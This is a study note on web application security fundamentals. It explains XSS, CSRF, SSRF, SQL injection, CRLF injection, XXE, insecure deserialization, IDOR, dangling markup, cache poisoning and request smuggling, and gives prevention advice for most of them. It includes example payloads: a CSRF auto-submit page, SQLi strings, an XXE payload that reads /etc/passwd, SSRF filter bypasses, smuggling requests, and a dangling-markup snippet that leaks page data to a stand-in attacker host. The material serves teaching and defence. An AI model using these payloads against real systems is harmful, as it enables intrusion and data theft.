---
title: Web Application Security Fundamentals
date: 2020-09-11 12:00:00 +0500
categories: [Web Application Security]
tags: [xss,xsrf,sqli,xxe,idor,ssrf,request-smuggling,insecure-deserialization,web-application,security,fundamental]
---

# XSS (Cross Site Scripting)

Cross site scripting is a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. It also allows the attackers to circumvent Same Origin Policy. Attackers can also masquerade as a victim user to carry out certain user-level actions. Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. There are 3 types of XSS attacks.

### DOM based XSS &rarr; (Type 0 or DOM-XSS)

This happens when an application contains some client side JS that processes data from an untrusted source in an unsafe way, usually by writing data back to the DOM. The attack payload is executed as a result of modifying the DOM environment in the browser used by the client side script. Example &rarr; Assume an application has the following JS code to read from an input field and write that to an element in the DOM &rarr;

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

If the attacker can control the value of the input field, they can construct a malicious value that causes their own script to execute, example &rarr;

```
results.innerHTML = 'You searched for: ' + '<img src=1 onerror="/* Bad stuff here... */">'
// becomes -> You searched for: <img src=1 onerror="/* Bad stuff here... */">
```

In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS. The ways to test for DOM-XSS are present in the resources.

### Stored XSS &rarr; (Persistent or Type I or Second order)

This happens when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. The injected script is permanently stored on the target servers in form of data sent through HTTP requests, like in a database or in a message forum. Example &rarr; Assume an attacker submits the following to a comment in an application that does not process the input entered by the users &rarr;

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E&name=Carlos+Montoya&email=carlos%40normal-user.net
----------
^^ Happens if the attacker submits -> <script>/* Bad stuff here... */</script>
```

Any user who visits the comment page will receive the above script inside a paragraph tag, say for example, and the script would execute on the victim's browser. Sammy's MySpace worm incorporated a similar technique. The attacker can carry out any of the actions that are applicable to the impact of reflected XSS vulnerabilities, but for all users who visit the page (or use a service).

### Reflected XSS &rarr; (Type II)

This is the simplest type of XSS, which arises when an application receives data in an HTTP request and includes the data within the immediate response in an unsafe way. The injected script is reflected off the web server, such as in an error message, search result, or a response that includes some or all of the input sent to the server in the HTTP request. A simple example would be as follows &rarr; `https://insecure-website.com/status?message=<script>/*bad stuff here*/</script>`. This includes the script tag inside a paragraph tag, say for example. If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access. The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS. Entry points include &rarr; Parameters or other data within URL query string or message body, HTTP request headers that might not be exploitable in relation to reflected XSS, Any routes via which the attacker can deliver data into the application.

### Prevention of XSS

1. CSP helps mitigate XSS and some other web vulnerabilities. If an application that employs CSP contains XSS like behavior, then CSP might hinder or prevent exploitation. However, CSP can often be circumvented. This should be used as a last line of defense to control if external scripts can be loaded into the page or not.
2. Filter input on arrival from server side as strictly as possible.
3. Encode user-controllable data on the output by applying combinations of HTML (< &rarr; <), CSS, JS (unicode encode) and URL encoding.
4. Using appropriate response headers &rarr; To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, **Content-Type** and **X-Content-Type-Options** headers ensure that browsers interpret the responses in the intended way.

# CSP (Content Security Policy)

CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources such as scripts and images that a page can load and restricting whether a page can be framed by other pages. To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.

### Mitigating XSS using CSP

`script-src 'self'` &rarr; This directive only allows scripts to be loaded from the same origin (as per SOP) as the page itself. `script-src <https://scripts.normal-website.com>` &rarr; This directive only allows scripts to be loaded from a specific domain. This may also be defeated when there is a way for the attacker to control content served from the external domain. For example, CDNs that do not use per-customer URLs such as `ajax.gooleapis.com` should not be trusted because third parties can get content onto their domains. CSP also has two other methods to specify trusted resources &rarr;

1. The CSP directive can specify a nonce (random value) and the same value must be used in the tag that loads a script. If unmatched, the script won't be executed. To be effective, the nonce must be securely generated on each page load i.e., non-guessable by the attacker.
2. The CSP directive can specify a hash of the contents of the trusted script. If the hash does not match, the script won't execute. The hash must be updated if the content of the script changes.

It is common for CSP to block resources like `script`. However, many CSPs allow image requests, which can be used to make requests to external servers to disclose CSRF tokens, for example.

# CSRF (Cross Site Request Forgery)

CSRF allows an attacker to induce users to perform actions they do not intend to perform by partly circumventing SOP. It is an exploit of a website where unauthorized commands are submitted from a user that the web application trusts without the user's intention. For a CSRF attack to be possible, three key conditions must be in place &rarr;

1. A relevant action &rarr; One that the attacker wishes to induce. The action may be privileged or on user-specific data like changing password.
2. Cookie based session handling &rarr; This must be accessible by the attacker because performing the action would depend on one or more HTTP requests for which the application solely relies on session cookies to identify the user and validate the requests.
3. No unpredictable requests parameters &rarr; The attacker should be able to guess all values or the attack will not be validated.

### Working attack example

Example &rarr; Assume an application has a function to change the email address on a user's account. A user would perform an action through a web request as follows &rarr;

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

The attacker now has the action for changing the email. The application verifies the request using session cookies without any non-guessable parameters or tokens. The attacker can then build a web page with the following HTML &rarr;

```
<html>
   <body>
      <form action="<https://vulnerable-website.com/email/change>" method="POST">
         <input type="hidden" name="email" value="pwned@evil-user.net" />
      </form>
      <script>
         document.forms[0].submit();
      </script>
   </body>
</html>
```

When a victim visits the website, the attacker's page will trigger the HTTP request. If the user is logged in to the web site, the browser will automatically include the session cookies if SameSite cookies are not used and the server will process the action, thereby executing the exploit. The exploit can be delivered by mechanisms similar to that of reflected XSS. Typically, the attacker places malicious HTML onto a web site that they control and then inducing victims to visit the web site. Some actions are executable by using only GET requests , for which the exploit is fully contained in a single link which can be delivered via image tags, for example.

### Prevention of CSRF

1. **Anti CSRF Token** &rarr; Add a per request nonce to the URL, all forms and standard sessions. This is the most robust defense against CSRF. The token must be unpredictable with high entropy, just like session tokens in general. They must be tied to the user's session and be strictly validated in every case before the relevant action is executed.
2. **SameSite Cookies** &rarr; This is another partially effective defense and should be used in conjunction with anti-CSRF tokens.
3. Check referrer header of requests to weed out malicious or suspected referrers. This is definitely not a robust way.

### CSRF tokens

It is a unique, secret, unpredictable value that has high entropy and is generated by the server side application. It is transmitted to the client to be included in a subsequent HTTP requests made by the client. **Generation** &rarr; A good choice is to use a cryptographic PRNG with the seed as the timestamp and a static secret. Further assurance beyond the strength of the PRNG can be achieved by generating individual tokens by concatenating it output with user specific entropy and then taking a strong hash of the entire structure. **Transmission** &rarr;

1. The tokens should always be transmitted as a hidden field in the HTML document. Example &rarr; `<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />` . The field containing the token should be placed as early as possible within the HTML document, specially before any locations where user controllable data is embedded within the HTML. This prevents the attacker from using some data to manipulate the HTML document and capturing parts of its. contents.
2. Placing the token in the URL query string is less safe because the query string is logged at various locations on the client and server sides, it is liable to be transmitted to third parties within the HTTP referrer header and can be displayed on screen within the user's browser.
3. Using the token in a custom request header is another defense that can thwart the efforts of an attacker who can predict or capture another user's token because browsers do not usually allow custom headers to be sent cross domain. This, however, limits applications from making CSRF protected requests using XHR as opposed to HTML forms.

**Storage and Validation** &rarr; The tokens should be stored on the server side within the user's session data. The application should verify the token included in subsequent requests.

### SameSite cookies

The SameSite attribute can be used to control whether and how the cookies can be submitted in cross-site requests. The attribute is added to the `Set-Cookie` header in the response and takes `Strict` and `Lax` as its values. Example &rarr; `SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;`.

1. The attribute set to `Lax` allows cookies to be included in case of GET requests if and only if the GET requests result from a top level navigation by the user (clicking a link). This is a partial defense against CSRF because CSRF attacks are generally implemented using POST method. However, some applications do implement sensitive actions using GET requests and many applications and frameworks are tolerant of different HTTP methods (even if they employ POST by design, they will accept requests switched to use GET).
2. The attribute set to `Strict` does not allow the cookie to be included in any requests that originate from another site. This is the most defensive option but can impair the experience.

# SSRF (Server Side Request Forgery)

SSRF is a web security vulnerability that allows an attacker to induce the server side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can often result in unauthorized actions or access to data within the organization's infrastructure or to external third party systems. It can often trigger arbitrary command execution.

### Working attack example

Assume that an attacker is trying to induce an application to make an HTTP request back to the server hosting the application via it's loopback interface. Assume that the application is a shopping application which has an API that let's users check the price of an item by querying various back end REST APIs and the function is implemented by passing the URL to relevant back end API endpoint via a front end HTTP request. A legitimate request would be as follows &rarr;

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

If the attacker modifies the request to specify a URL local to the server, for example &rarr; `stockApi=http://localhost/admin` , the server would fetch the /admin URL and serve to the user (attacker). This happens because the application trusts the requests that come from the local machine. Such an issue can arise because of the following reasons &rarr;

1. The Access Control check might be implemented in a different component that sits in front of the application server. Thus, when a request is made back to the server itself, the check is bypassed.
2. The application might allow admin access from localhost without a login for disaster recovery purposes, assuming that only a fully trusted user would be coming directly from the server.

The same attack can be made to other servers on the local network of the server in a similar manner.

### Circumventing common defenses

1. SSRF with blacklist based input filters &rarr; Some applications block input containing hostnames like `127.0.0.1` or `localhost` or sensitive URLs like `/admin` . Using an alternate IP representation like `2130706433` instead of `127.0.0.1` and obfuscating blocked strings using URL encoding or case variation can be used to circumvent this defense.
2. SSRF with whitelist based input filters &rarr; Only allows inputs with certain whitelisted values. To circumvent this, credentials can be embedded before the hostname using the `@` symbol such as `https://expected-host@evil-host` or URL encode characters to confuse parsing code.

# SQLi (SQL injection)

SQL injection is a vulnerability that allows attackers to interfere with queries that an application makes to its databases i.e., a code injection technique used to modify or retrieve data from SQL databases. An attacker can often compromise the server using privilege escalation or cause DoS attacks. Backdoors into the databases are also common for persisted attacks.

### Injection examples

1. Retrieving hidden data &rarr; `https://insecure-website.com/products?category=Gifts'+OR+1=1--` converts the query to `SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1`. This causes everything after `--` to be commented out and include all categories of products.
2. Subverting application logic &rarr; Entering a username of `administrator'--` causes the query to be `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''` essentially logging into admin without the requirement of a password.
3. Retrieving data from other databases &rarr; This makes use of UNION tags.
4. Examining the database &rarr; Getting the schema of tables with a query `SELECT * FROM information_schema.tables` .
5. Blind SQL injection &rarr; Blind SQL injection is done using sleep statements when no data is returned by the vulnerable action to trigger delays or by triggering SQL errors using conditionals.

### Second order SQLi

In second-order SQLi (aka stored SQLi), the application takes user input from an HTTP request and stores it for future use. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way. This generally arises when developers fix SQLi vulnerability by safely handling the input's initial placement in the database. Later, because of an assumption that the input is safe, it is handled in an unsafe way.

### SQLi prevention

1. SQLi can be prevented using prepared statements with parameterized queries (variable binding). This means defining the SQL queries first and passing the variables in later, thus distinguishing between code and data perfectly. It can cause a performance hit, in the case of which it is best to validate all data and escape user supplied input using an escaping routine.
2. Stored Procedures is another defense, however, they are not always safe from SQL injection. Certain stored procedure programming has similar effect to that of parameterized queries. The SQL queries are defined like in prepared statements, however, the code is defined and stored in the database itself and then called from the application.
3. Whitelisting Input Validation to remove parts of the input that are not legal for the use of bind variables, like names of tables or columns or the sort order (ASC or DESC).
4. Escaping all user input using a known public function and ensuring that errors in SQL are not user facing.

# CRLFi (Carriage Return Line Feed injection)

A CRLF injection vulnerability exists if an attacker can inject the CRLF characters into a web application, for example using a user input form or an HTTP request. CR and LF are special characters (ASCII 13 and 10 respectively, also referred to as \r\n) that are used to signify the End of Line (EOL). The CRLF sequence is used in windows and internet protocols including HTTP but not in Unix/Linux. two most common uses of CRLF injection attacks are &rarr; Log Poisoning (attacker falsifies log entries by inserting an EOL and an extra line. This can be used to hide other attacks or confuse sysadmins) and HTTP Response Splitting.

### HTTP Response Splitting

CRLFi can be used to add HTTP headers to HTTP response and perform an XSS attack for example. The HTTP protocol uses CRLF character sequence to signify the end of a header and beginning of the next header or the website content. This is also called HTTP header injection. Inserting double CRLF prematurely terminates HTTP headers and the attacker can inject content before the actual website content, which can contain JS code to execute XSS. Example &rarr; Assume the following

```
<http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E>
```

This does the following &rarr;

1. Add a fake HTTP response header &rarr; `Content-Length: 0` . This causes the web browser to treat this as a terminated response and begin parsing a new response.
2. Add a fake HTTP response &rarr; `HTTP/1.1 200 OK` . This begins the new response.
3. Add another fake HTTP response header &rarr; `Content-Type: text/html` . This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header &rarr; `Content-Length: 25` . This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS &rarr; `<script>alert(1)</script>` . This content has exactly 25 bytes.
6. Because of the `Content-Length` header, the web browser ignores the original content that comes from the web server.

Variations of this attack can be used to poison proxy or web caches in order to get the cache to serve the attacker’s content to other users.

### Prevention

User input shouldn't be blindly trusted. Newlines must be stripped before passing content into the HTTP headers. The data should be encoded before passing into the headers so that the CR and LF codes can be scrambled if they are injected into the content.

# XXE (XML External Entity) injection

XXE is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data and view files on the application server filesystem, and to interact with any back end or external systems that the application itself can access. In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back end infrastructure, by leveraging the XXE vulnerability to perform SSRF attacks. Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. The vulnerability arises because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application. XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD (Document Type Definition) in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

### Types of Attacks

1. Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response &rarr;
2. The submitted XML needs to be modified in two ways &rarr;
	- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
	- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
3. Example &rarr; a shopping application checks for the stock level of a product by submitting the following XML to the server &rarr;

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

1. The application performs no particular defenses against XXE attacks, so it can be exploited to retrieve the `/etc/passwd` file by submitting the following XXE payload &rarr;

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

1. This payload defines an external entity `&xxe;` whose value is the contents of `/etc/passwd` and uses the entity within the `productId` value. This causes the application's response to include the contents of the file.
2. Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system &rarr;
3. To exploit this, one needs to define an external XML entity using the target URL, and use the defined entity within a data value. If the defined entity is used within a data value that is returned in the application's response, the response from the URL can be viewed within the application's response and a two-way interaction with the back end system can be gained. If not, then blind SSRF attacks can be performed.
4. Example &rarr; the external entity will cause the server to make a back end HTTP request to an internal system within the organization's infrastructure in the following &rarr;

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "<http://internal.vulnerable-website.com/>"> ]>
```

1. Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.
2. Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.

# Insecure Deserialization

### Serialization vs Deserialization

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a **flatter** format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to write complex data to inter process memory, a file, or a database, and send complex data, for example, over a network, between different components of an application, or in an API call. **Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.

### Attacks

Insecure deserialization is when user controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code. It is even possible to replace a serialized object with an object of an entirely different class. An object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed before deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques. Ideally, user input should never be deserialized at all. Any form of additional check on the deserialized data is often ineffective because it is virtually impossible to implement validation or sanitization to account for every eventuality. Moreover, these checks are fundamentally flawed as they rely on checking the data after it has been deserialized. If there is some sort of serialization in some application, one can check if there is some control over that data. Example &rarr; PHP serialization may change a data structure into something like the following &rarr;

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

This can be interpreted as follows &rarr;

- `O:4:"User"` - An object with the 4-character class name `"User"`
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
- `b:1` - The value of the second attribute is the boolean value `true`

The native methods for PHP serialization are `serialize()` and `unserialize()` . With some control over the input, attributes like `isLoggedIn` can be modified.

### Prevention

Ideally, the best prevention method is to not deserialize user input at all. If ever required, the best way would be to incorporate a check on the integrity of the input to make sure it isn't tampered with by using an integrity check. This can only help in certain cases.

# IDOR (Insecure Direct Object References)


IDOR is a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. It is mainly an example of how access control can be circumvented. It is commonly associated with horizontal privilege escalation but also arise in vertical privilege escalation.

### Direct reference to database objects

Consider a website that uses the following URL to access the customer account page, by retrieving information from the back end database &rarr; `https://insecure-website.com/customer_account?customer_number=132355` The customer number is used directly as a record index in queries that are performed on the back end database. If no other controls are in place, an attacker can simply modify the `customer_number` value, bypassing access controls to view the records of other customers. This is an example of an IDOR vulnerability leading to horizontal privilege escalation. A vertical privilege can be gained by using customer numbers of privileged people.

### Direct reference to static files

An IDOR vulnerability often arises when sensitive resources are located in static files on the server side filesystem. For example, a website might save chat message transcripts to disk using an incrementing filename, and allow users to retrieve these by visiting a URL like the following &rarr; `https://insecure-website.com/static/12144.txt` . In this situation, an attacker can simply modify the filename to retrieve a transcript created by another user and potentially obtain user credentials and other sensitive data.

# Dangling Markup Injection

This is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible. Suppose an application embeds attacker-controllable data into its responses in an unsafe way &rarr;

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE">
```

Suppose the application does not filter or escape the `>` or `"` characters, then the attacker can use them to escape out of the input's value attribute. This is a natural entry point to XSS, however, if it is not possible due to filters or CSP, then a dangling markup injection is still possible lie this &rarr; `"><img src='//attacker-website.com?` . When the browser parses the page, it sees that the attacker doesn't end the `src` for the image tag. So, the browser will search for a single quote in the document. This causes everything up to that character to be sent to the attacker's server, with everything being URL encoded. Depending on the functionality, this may include CSRF tokens, email messages, etc.

### Prevention

The prevention is the same as preventing cross-site scripting, by encoding data on output and validation on input. Some (not all) dangling markup injections can be prevented using CSP.

# Web Cache Poisoning

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. It involves two phases. First, the attacker must work out how to elicit a response from the back end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims. When the cache receives an HTTP request, it first has to determine whether there is a cached response that it can serve directly, or whether it has to forward the request for handling by the back-end server. Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the `cache key`. Typically, this would contain the request line and Host header. Components of the request that are not included in the cache key are said to be `unkeyed`. If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent. This applies for future requests until the cache key expires.

### Constructing an attack

1. Identify and Evaluate unkeyed inputs &rarr; One can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response.
2. Elicit a harmful response from the back end server &rarr; After identifying an unkeyed input, the next step is to evaluate exactly how the website processes it. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning.
3. Get the response cached &rarr; Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless the response can be cached. Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. This probably requires playing around with different requests on different pages.

### Prevention

The definitive way to prevent web cache poisoning would clearly be to disable caching altogether. If caching is needed, restricting it to purely static responses is also effective.

# HTTP Request Smuggling

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends &rarr; the `Content-Length` header and the `Transfer-Encoding` header. The Content-Length header is straightforward &rarr; It specifies the length of message body in bytes. Example &rarr;

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. Example &rarr;

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

### Attack

Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front end and back end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers &rarr;

- CL.TE &rarr; the front end server uses the `Content-Length` header and the back end server uses the `Transfer-Encoding` header. Example &rarr;

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- The front end sees the content length as 13 and determines the length to be 13 bytes upto the end of the word SMUGGLED. The back end sees an empty message because it uses transfer encoding so the word SMUGGLED is left unprocessed and considered the start of the next request in sequence.
- [TE.CL](http://te.cl/) &rarr; the front end server uses the `Transfer-Encoding` header and the back end server uses the `Content-Length` header.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- The word SMUGGLED would be considered the start of the next request in sequence.
- TE.TE &rarr; the front end and back end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### Prevention

HTTP request smuggling vulnerabilities arise in situations where a front-end server forwards multiple requests to a back-end server over the same network connection, and the protocol used for the back-end connections carries the risk that the two servers disagree about the boundaries between requests. Some generic ways are &rarr;

- Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.
- Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.
- Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests.
- Making the front-end server normalize ambiguous requests or making the back-end reject ambiguous requests.

# Resources

1. [Cross-Site Scripting (XSS) Cheat Sheet - 2020 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
2. [What is DOM-based XSS (cross-site scripting)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based)
3. [What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
4. [What is Blind SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection/blind)
5. [Content security policy | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)
6. [Insecure deserialization | Web Security Academy](https://portswigger.net/web-security/deserialization)
7. [Web cache poisoning | Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning)
8. [What is SSRF (Server-side request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/ssrf)
9. [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)
10. [What is CSRF (Cross-site request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/csrf)
11. [SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
12. [What Are CRLF Injection Attacks | Acunetix](https://www.acunetix.com/websitesecurity/crlf-injection/)
13. [Insecure direct object references (IDOR) | Web Security Academy](https://portswigger.net/web-security/access-control/idor)
14. [What is HTTP request smuggling? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/request-smuggling)
15. [Same-origin policy (SOP) | Web Security Academy](https://portswigger.net/web-security/cors/same-origin-policy)
16. [CSRF tokens | Web Security Academy](https://portswigger.net/web-security/csrf/tokens)
17. [Defending against CSRF with SameSite cookies | Web Security Academy](https://portswigger.net/web-security/csrf/samesite-cookies)
18. [What is XXE (XML external entity) injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe)
19. [Dangling markup injection | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
